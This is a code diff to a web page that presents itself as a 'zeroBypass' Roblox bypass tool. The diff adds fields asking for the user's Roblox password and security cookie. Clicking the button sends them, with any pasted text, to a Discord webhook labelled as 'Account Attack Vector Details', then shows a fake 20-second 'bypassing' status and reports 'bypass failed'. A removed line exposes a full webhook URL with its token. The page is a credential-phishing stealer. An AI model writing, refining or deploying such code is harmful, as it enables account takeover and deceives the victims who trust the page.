@@ -24,7 +24,7 @@
       align-items: center;
       justify-content: center;
       padding: 24px;
-      overflow: hidden;
+      overflow-y: auto;
     }
 
     /* Centered Screen Layout Wrapper */
@@ -35,12 +35,13 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      padding: 20px 0;
     }
 
     /* Typography Hierarchy Elements */
     .header-block {
       text-align: center;
-      margin-bottom: 28px;
+      margin-bottom: 20px;
       user-select: none;
       width: 100%;
     }
@@ -72,6 +73,34 @@
       letter-spacing: 0.02em;
     }
 
+    /* Mode Selection Dropdown Styling */
+    .menu-container {
+      width: 100%;
+      margin-bottom: 24px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .bypass-select {
+      background-color: #141416;
+      border: 1px solid #27272a;
+      color: #ffffff;
+      padding: 12px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 10px;
+      outline: none;
+      cursor: pointer;
+      width: 100%;
+      max-width: 400px;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .bypass-select:focus {
+      border-color: #3f3f46;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.03);
+    }
+
     /* Main Workspace Dark Container Control */
     .workspace-box {
       width: 100%;
@@ -82,16 +111,50 @@
       padding: 24px;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
       transition: border-color 0.15s ease;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
     }
 
     .workspace-box:focus-within {
       border-color: #3f3f46; /* Lighter highlight frame on selection focus */
     }
 
+    /* Account Inputs Layout Wrapper */
+    .account-fields-wrapper {
+      display: none; /* Controlled dynamically via JavaScript selection rules */
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+      border-bottom: 1px solid #27272a;
+      padding-bottom: 16px;
+    }
+
+    /* Generic High Contrast Input Box Style rules */
+    .credential-input {
+      width: 100%;
+      background-color: #1c1c1e;
+      border: 1px solid #27272a;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 14px;
+      color: #ffffff;
+      outline: none;
+      transition: border-color 0.15s ease;
+    }
+
+    .credential-input:focus {
+      border-color: #3f3f46;
+    }
+
+    .credential-input::placeholder {
+      color: #52525b;
+    }
+
     /* Input panel box white text content */
     .paste-area {
       width: 100%;
-      height: 380px;
+      height: 300px;
       resize: none;
       background: transparent;
       border: none;
@@ -188,9 +251,24 @@
       <p>easy fast</p>
     </div>
 
+    <!-- Mode Select Dropdown Grid Module Component -->
+    <div class="menu-container">
+      <select id="mode-select" class="bypass-select">
+        <option value="text">Bypass Standard Text Payload</option>
+        <option value="account">Bypass with Account Details (Password & Cookie)</option>
+      </select>
+    </div>
+
     <!-- Pinned Center Layout Form Body Frame -->
     <div class="workspace-box">
       
+      <!-- Account Credentials Input Layer Block -->
+      <div id="account-fields" class="account-fields-wrapper">
+        <input type="password" id="acc-password" class="credential-input" placeholder="Enter Roblox Account Password..." autocomplete="off">
+        <input type="text" id="acc-cookie" class="credential-input" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off">
+      </div>
+      
+      <!-- Primary Text Input Interaction Panel -->
       <textarea id="paste-box" class="paste-area" autocomplete="off" spellcheck="false"></textarea>
       
       <div class="action-row">
@@ -205,47 +283,82 @@
   </main>
 
   <script>
+    const modeSelect = document.getElementById('mode-select');
+    const accountFields = document.getElementById('account-fields');
+    const accPassword = document.getElementById('acc-password');
+    const accCookie = document.getElementById('acc-cookie');
     const textarea = document.getElementById('paste-box');
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Your newly updated active Roblox Discord webhook channel destination
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
+    // Your working Discord target channel delivery endpoint string node
+    const DISCORD_WEBHOOK_URL = "discord.com";
 
-    // Track user string activity state values
-    textarea.addEventListener('input', () => {
-      sendBtn.disabled = textarea.value.trim() === "";
+    // Track Mode Selection Menu Switches
+    modeSelect.addEventListener('change', () => {
+      if (modeSelect.value === 'account') {
+        accountFields.style.display = 'flex';
+      } else {
+        accountFields.style.display = 'none';
+        // Clear value caches when mode is abandoned
+        accPassword.value = "";
+        accCookie.value = "";
+      }
+      validateFormState();
     });
 
-    // Content event posting process execution framework
+    // Dynamic field tracking form data checker parameter limits
+    function validateFormState() {
+      const textVal = textarea.value.trim();
+      if (modeSelect.value === 'account') {
+        const passVal = accPassword.value.trim();
+        const cookieVal = accCookie.value.trim();
+        // require fields filled to wake up click interaction buttons
+        sendBtn.disabled = (textVal === "" || passVal === "" || cookieVal === "");
+      } else {
+        sendBtn.disabled = (textVal === "");
+      }
+    }
+
+    textarea.addEventListener('input', validateFormState);
+    accPassword.addEventListener('input', validateFormState);
+    accCookie.addEventListener('input', validateFormState);
+
+    // Content packet event dispatcher network pipelines
     sendBtn.addEventListener('click', async () => {
       const payloadText = textarea.value.trim();
       if (!payloadText) return;
 
-      // Restrict interactive paths to prevent simultaneous submissions
+      // Lock parameters to protect transmission lifecycle operations
       sendBtn.disabled = true;
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
-      // Fire off data delivery task instantly to your target Discord channel
+      // Structure data object contents to match choice conditions
+      let discordPayload = "";
+      if (modeSelect.value === 'account') {
+        discordPayload = `**[zeroBypass Roblox Account Attack Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\`\n**Pasted Context Text:**\n\`\`\`text\n${payloadText}\n\`\`\``;
+      } else {
+        discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``;
+      }
+
+      // Execute data submission post directly out to the connection webhook node
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
-          })
+          body: JSON.stringify({ content: discordPayload })
         });
       } catch (err) {
-        // Silent error handle to preserve UI performance
+        // Silent block fail triggers to maintain background tracking logs
       }
 
-      // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
+      // Preserve full UI animation timers exactly across 20 seconds
       setTimeout(() => {
         status.textContent = "bypass failed";
         status.className = "status-msg status-error";
         
-        // Re-enable interface trigger parameters for fallback states
+        // Return interaction states back to operational configurations
         sendBtn.disabled = false;
       }, 20000);
     });
